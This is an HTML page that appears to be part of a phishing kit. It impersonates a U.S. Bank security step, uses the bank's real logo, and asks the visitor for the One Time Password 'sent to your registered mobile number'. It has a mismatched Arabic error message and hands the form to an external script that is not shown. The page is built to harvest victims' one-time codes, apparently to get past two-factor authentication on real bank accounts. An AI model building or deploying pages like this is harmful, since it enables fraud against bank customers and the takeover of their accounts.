<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Security | U.S. Bank</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div id="loader"><div class="spinner"></div></div>
    <header class="header">
        <img src="https://www.usbank.com/etc.clientlibs/ecm-global/clientlibs/clientlib-resources/resources/images/svg/logo-personal.svg" alt="U.S. Bank">
    </header>

    <div class="main-wrapper">
        <div class="login-content" style="text-align: center;">
            <h1 style="color:#0c1c3e; font-size: 24px;">Security</h1>
            <p style="font-size: 14px; margin-bottom: 30px;">We have sent a One Time Password to your registered mobile number</p>
            
            <form id="otpForm">
                <div id="otp-error" style="color: #d40511; font-weight: bold; margin-bottom: 15px; display: none;">الرجاء اعادة ادخال الـ OTP بشكل صحيح</div>
                <div class="form-group">
                    <input type="text" id="otp_val" placeholder="One Time Password" required>
                </div>
                <button type="submit" class="submit-btn">Log in</button>
            </form>
        </div>
    </div>

    <footer class="footer">
        </footer>
    <script src="script.js"></script>
</body>
</html>
